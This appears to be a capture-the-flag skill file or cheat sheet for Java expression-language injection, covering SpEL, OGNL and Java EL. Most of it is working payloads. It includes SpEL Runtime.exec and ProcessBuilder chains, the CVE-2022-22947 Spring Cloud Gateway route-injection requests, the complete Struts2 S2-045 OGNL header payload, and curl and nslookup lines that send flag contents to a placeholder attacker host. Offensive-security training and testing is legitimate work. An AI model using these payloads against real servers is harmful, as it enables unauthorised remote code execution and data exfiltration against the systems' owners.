---
name: expression-language-injection
description: Java Expression Language (EL/SpEL/OGNL) injection. Use when `${7*7}` or `%{7*7}` evaluates server-side in a Java app (Spring, Struts2, Confluence, Thymeleaf). Distinct from SSTI — this targets expression evaluators in Java frameworks. Covers SpEL Runtime.exec chains, Spring Cloud Gateway route injection, and Struts2 OGNL.
---

# Expression Language Injection — SpEL / OGNL / Java EL

## 1. Detect & disambiguate

```
${7*7}                    → 49 = SpEL / Java EL / OGNL
#{7*7}                    → 49 = SpEL (alt) / JSF
%{7*7}                    → 49 = OGNL (Struts2)
${T(java.lang.Math).random()} → random float = SpEL confirmed
%{#context}               → object dump = OGNL confirmed
```

| `${7*7}` | `%{7*7}` | Engine |
|---|---|---|
| 49 | literal | SpEL / Java EL |
| literal | 49 | OGNL (Struts2) |
| 49 | 49 | both active |

## 2. SpEL (Spring) RCE chains

```java
// Runtime.exec (no output)
${T(java.lang.Runtime).getRuntime().exec("id")}

// Runtime.exec + output capture (Commons IO)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cat /flag*").getInputStream())}

// Output capture via Spring StreamUtils (often on classpath)
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()))}

// ProcessBuilder when Runtime is blocked
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947 (route SpEL injection)

If `/actuator/gateway/routes` is reachable, add a malicious route whose filter evaluates SpEL, then refresh:

```bash
POST /actuator/gateway/routes/hacktest
{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result",
 "value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()))}"}}],
 "uri":"http://example.com"}
POST /actuator/gateway/refresh          # trigger evaluation
GET  /actuator/gateway/routes/hacktest  # read command output in the Result header
```

## 3. OGNL (Struts2) — S2-045 Content-Type

```http
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

## 4. Read the flag

Replace `id` with `cat /flag*` / `find / -name 'flag*' -exec cat {} \; 2>/dev/null`. When output is suppressed, use OOB: exec `curl ATTACKER/$(cat /flag*)` or `nslookup $(cat /flag*).ATTACKER`.

## 5. Discipline

- Confirm `${7*7}` → 49 before building the chain (a literal echo = no injection).
- Java RCE rarely prints stdout — always wrap `exec` in an output-capture gadget (IOUtils/StreamUtils) or go OOB.
- Map the framework first (Spring→SpEL, Struts2→OGNL) — the chains are not interchangeable.
